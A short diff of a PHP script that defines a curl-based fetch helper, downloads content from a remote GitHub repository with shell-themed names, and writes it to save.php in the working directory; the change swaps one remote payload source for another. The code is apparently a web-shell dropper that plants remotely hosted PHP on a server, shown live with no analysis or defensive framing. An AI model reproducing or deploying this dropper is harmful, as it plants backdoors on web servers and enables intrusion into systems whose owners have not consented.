@@ -8,7 +8,7 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$s = http_get('https://raw.githubusercontent.com/kingfaouzizky/shellminsbypass/main/alfabet');
+$s = http_get('https://raw.githubusercontent.com/kingfaouzizky/shellpriv187/main/marijuana');
 $check = getcwd() . "/save.php";
 $text = $s;
 $open = fopen($check, 'w');
